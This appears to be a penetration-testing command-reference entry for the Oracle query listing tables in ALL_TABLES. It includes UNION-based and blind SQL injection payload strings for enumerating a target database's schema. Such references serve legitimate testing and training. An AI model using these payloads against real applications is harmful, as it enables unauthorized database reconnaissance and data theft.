---
id: 54ccfa5c-5061-48e7-95f1-e0212e189870
name: oracle-sql-list-all-tables
type: command
executor: sql
data: SELECT table_name FROM all_tables;
output: null
created_at: '2023-04-06T03:56:35.238283+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Oracle Database
tags:
  - database-discovery
  - sql-injection
verified: true
validated: true
---

# oracle-sql-list-all-tables

## Command

```sql
SELECT table_name FROM all_tables;
```

## Description

This SQL command queries the ALL_TABLES system view in Oracle to retrieve a list of all table names accessible to the current user. Use it in SQL injection payloads to enumerate the database schema during reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | No parameters; direct query on system view | Yes |

## Examples

### Basic Usage

```sql
SELECT table_name FROM all_tables;
```

Inject into a vulnerable query like: `' UNION SELECT table_name FROM all_tables--`

### Advanced Usage

Combine with ORDER BY for blind SQLi extraction: `' AND (SELECT COUNT(*) FROM all_tables)>0--`

## Expected Output

A list of table names, e.g.:

TABLE_NAME
----------
USERS
EMPLOYEES
PASSWORDS

## Related

- [[procedures/Oracle-SQL-List-Tables-and-Columns]]
- [[commands/oracle-sql-list-tables-with-owner]]
